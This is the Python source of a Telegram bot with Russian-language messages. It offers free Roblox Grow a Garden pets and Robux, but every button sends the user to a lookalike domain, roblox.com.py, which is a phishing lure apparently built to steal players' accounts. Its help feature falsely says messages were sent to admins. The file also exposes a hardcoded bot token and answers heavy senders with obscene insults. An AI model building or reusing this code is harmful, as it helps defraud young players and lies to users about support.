import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
import time
import random
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

TOKEN = "8265510445:AAHdE3q8Mdpy9Gf0pTtVXdbgz6opxXh0YKE"
bot = telebot.TeleBot(TOKEN)

PETS = [
    ("🦝 Raccoon", "https://roblox.com.py/games/126884695634066/Grow-a-Garden?privateServerLinkCode=35500455072211143886256645536"),
    ("🪰 Dragonfly", "https://roblox.com.py/games/126884695634066/Grow-a-Garden?privateServerLinkCode=35500455072211143886256645536"),
    ("🦊 Fennec Fox", "https://roblox.com.py/games/126884695634066/Grow-a-Garden?privateServerLinkCode=35500455072211143886256645536"),
    ("🦊 Kitsune", "https://roblox.com.py/games/126884695634066/Grow-a-Garden?privateServerLinkCode=35500455072211143886256645536"),
    ("🦖 T-rex", "https://roblox.com.py/games/126884695634066/Grow-a-Garden?privateServerLinkCode=35500455072211143886256645536"),
    ("🐝 Disco Bee", "https://roblox.com.py/games/126884695634066/Grow-a-Garden?privateServerLinkCode=35500455072211143886256645536"),
    ("🍟 French Fry Ferret", "https://roblox.com.py/games/126884695634066/Grow-a-Garden?privateServerLinkCode=35500455072211143886256645536"),
    ("🐙 Mimic Octopus", "https://roblox.com.py/games/126884695634066/Grow-a-Garden?privateServerLinkCode=35500455072211143886256645536"),
    ("🦊 Red Fox", "https://roblox.com.py/games/126884695634066/Grow-a-Garden?privateServerLinkCode=35500455072211143886256645536"),
    ("💰 Робуксы", "https://roblox.com.py/games/8737602449/PLS-DONATE?privateServerLinkCode=35500455072211143886256645536")
]

help_mode_users = set()
user_message_times = {}

spam_responses = [
    "Ты че, долбоёб? Не спамь!",
    "Блядь, хватит уже флудить, дебил.",
    "Уебок, перестань писать столько хуни!",
    "Сука, прекрати этот спам, мудак!",
    "Идиот, да хватит уже тыкать сюда свои сообщения!",
    "Долбаёб, когда уже остановишься?",
    "Пиздуй с этим спамом, пёс!",
    "Клоун, перестань пихать сообщения!",
    "Отвали, пиздун! Хватит флудить!",
    "Мудак, ты реально не понимаешь, что это спам?"
]

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Bot is running')

def run_server():
    server = HTTPServer(('0.0.0.0', 8000), Handler)
    server.serve_forever()

threading.Thread(target=run_server).start()

@bot.message_handler(commands=['start'])
def start(message):
    if message.chat.id in help_mode_users:
        help_mode_users.remove(message.chat.id)
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [KeyboardButton(name) for name, _ in PETS]
    markup.add(*buttons)
    bot.send_message(
        message.chat.id,
        "Привет! Я бот, который помогает получить питомцев в Grow a Garden Roblox.\nВыбери пета:",
        reply_markup=markup
    )

@bot.message_handler(commands=['help'])
def help_command(message):
    help_mode_users.add(message.chat.id)
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("📨 Отправить"))
    bot.send_message(
        message.chat.id,
        "Опиши проблему или вопрос. Когда закончишь — нажми кнопку '📨 Отправить'.",
        reply_markup=markup
    )

@bot.message_handler(func=lambda m: m.text == "📨 Отправить")
def send_help(message):
    if message.chat.id in help_mode_users:
        help_mode_users.remove(message.chat.id)
    bot.send_message(
        message.chat.id,
        "Спасибо! Ваше сообщение отправлено, админы скоро свяжутся с вами.",
        reply_markup=ReplyKeyboardRemove()
    )

@bot.message_handler(func=lambda m: True)
def handle_all_messages(message):
    user_id = message.chat.id
    now = time.time()
    if user_id not in user_message_times:
        user_message_times[user_id] = []
    user_message_times[user_id] = [t for t in user_message_times[user_id] if now - t < 60]
    user_message_times[user_id].append(now)
    if len(user_message_times[user_id]) > 20:
        bot.send_message(user_id, random.choice(spam_responses))
        return
    if user_id in help_mode_users:
        return
    text = message.text.strip()
    for pet_name, pet_link in PETS:
        if text == pet_name:
            bot.send_message(
                user_id,
                f"Чтобы получить {pet_name}, зайди на VIP-сервер бота по ссылке:\n{pet_link}",
                reply_markup=ReplyKeyboardRemove()
            )
            return
    bot.send_message(user_id, "Я тебя не понимаю. Напиши /start или /help.")

bot.polling()
